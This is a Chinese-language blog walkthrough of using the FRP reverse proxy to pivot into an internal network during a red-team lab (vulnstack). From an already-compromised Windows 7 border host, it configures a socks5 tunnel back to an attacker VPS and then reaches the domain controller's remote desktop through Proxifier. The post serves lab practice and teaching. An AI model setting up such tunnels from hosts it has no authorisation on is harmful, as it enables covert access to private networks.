---
title: "代理及转发之FRP"
categories: ["安全技术", "工具分享"]
tags: ["内网代理", "内网穿透"]
draft: false
slug: "567"
date: "2020-12-27 21:27:00"
---

# 介绍及环境

`frp`是一个高性能的反向代理应用，可以使目标对外开放端口，支持

- tcp
- http
- https

等协议类型，并且`web`服务支持根据域名进行路由转发，从而在红队行动时实现内网穿透

`frp`作为反向代理工具胜在稳定，但是其依赖配置文件，溯源容易

本篇文章在《ATT&CK 实战 - 红日安全 vulnstack (一)》文章使用到的环境基础上实现

网络配置示意图如下所示：

![][1]

- 已知 win7 作为边界机，已突破拿到 shell

- 域控主机已开启允许远程访问

这里已经提前上线`cs`，其实`cs`可以直接一键开启`socks`隧道但是不在本文范围之内

通过`cs`查看目标主机`win7`的`ip`有两个内网网段

![][2]

![][3]

# FRP 代理进入内网

首先需要明确代理流程

- 需要是攻击机笔记本的程序能够使用代理进行访问该域环境内网

首先从[GitHub][4]下载对应版本的`FRP`代理程序

打开可以看到`FRP`针对每种操作系统都有对应版本的程序：

![][5]

以`windows64`版本为例，包含文件有如下：

- systemd
- frpc.exe
- frpc.ini
- frpc_full.ini
- frps.exe
- frps.ini
- frps_full.ini
- LICENSE

可以看出同一操作系统，官方默认提供`server`端和`cilent`端

在攻击机，也就是拥有公网`ip`的`vps`先配置`frps.ini`

默认配置文件是这样的：

```
[common]
server_addr = 127.0.0.1
server_port = 7000

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000
```

此处暂时先以最基础的配置介绍：

```
[common]
bind_port = 7000
token = 145678
```

其实最基础的只需前两行，但是建议习惯加上`token`哈，然后开启服务器：

```
frps -c frpc.ini
```

![][6]

此时目标机需要配置连接我们的`vps`之外，还需配置`socks5`隧道才能让我们进入目标环境的内网，最简单的配置应该如下：

```
[common]
server_addr = x.x.x.x
server_port = 7000
token = 145678

[socks1]
type = tcp
remote_port = 6666
plugin = socks5
plugin_user = admin
plugin_passwd = passwd
```

启动客户端`frp`：

![][7]

此时`vps`收到连接：

![][8]

这时候我们笔记本攻击机就可以挂着`socks5:VPS-IP:6666`来访问边界区可以访问的目标了

> 结束 frp 时可以使用 ps -aux|grep frp 命令列出 frp 进程信息，然后再用 kill 命令结束掉 frp 进程

本地访问可以用`Proxifier`，将需要使用的工具设置为走该代理

## proxifier 进行代理

添加我们的服务器如下：

![][9]

将远程桌面工具`mstsc.exe`添加规则：

![][10]

此时在我们本地使用远程工具`mstsc`直接连接内网的域控主机`192.168.52.138`：

![][11]

已经可以成功访问到目标主机内网的域控远程桌面

在连接的时候可以看到`proxifier`打印出了日志，显示通过代理开始连接

要使用其他工具对内网进行扫描也是一样的，只需要在`proxifier`中将使用到的程序配置规则即可

# frp 优化

**敬请期待更新**

参考文章：

- [FRP 内网穿透实践][12]
- [内网渗透 | 常用的内网穿透工具使用][13]
- [浅析内网渗透代理][14]
- [某大学渗透测试实战靶场报告-Part1][15]
- [实战中内网穿透的打法][16]

[1]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_204917.png
[2]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_205935.png
[3]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_210044.png
[4]: https://github.com/fatedier/frp/releases/latest
[5]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_205745.png
[6]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_210345.png
[7]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_210513.png
[8]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_210539.png
[9]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_210703.png
[10]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_210729.png
[11]: https://img.soapffz.com/archives_img/2020/12/27/archives_20201227_210756.png
[12]: https://mp.weixin.qq.com/s/u-K5Ge_Ql0_q2NxcwhnD4A
[13]: https://mp.weixin.qq.com/s/04TvD-hBDG5MhSDK3TWvtg
[14]: https://mp.weixin.qq.com/s/BS7lUCgND2_N_J3fcav3Zg
[15]: http://mp.weixin.qq.com/s?__biz=Mzg4MzA4Nzg4Ng==&mid=2247484218&idx=1&sn=dd4a356ab5e6594fe457c5f80ca72537&chksm=cf4d8c5bf83a054dd0900fa0173fb01a3f91204bc1a5a12772aed72bec0539f0b813081301a4&mpshare=1&scene=1&srcid=&sharer_sharetime=1579226296742&sharer_shareid=e9d935b08e3994ebe99d45916b3e1a98#rd
[16]: http://mp.weixin.qq.com/s?__biz=MzUyNTk1NDQ3Ng==&mid=2247484897&idx=1&sn=1e71969ca83acf4e15321e2bf7dc25ea&chksm=fa177922cd60f0347d88b39c63f88e37a3b79e2f5d0bd238a823a867c3d30a3b38668cfc711e&mpshare=1&scene=1&srcid=&sharer_sharetime=1578296540835&sharer_shareid=e9d935b08e3994ebe99d45916b3e1a98#rd
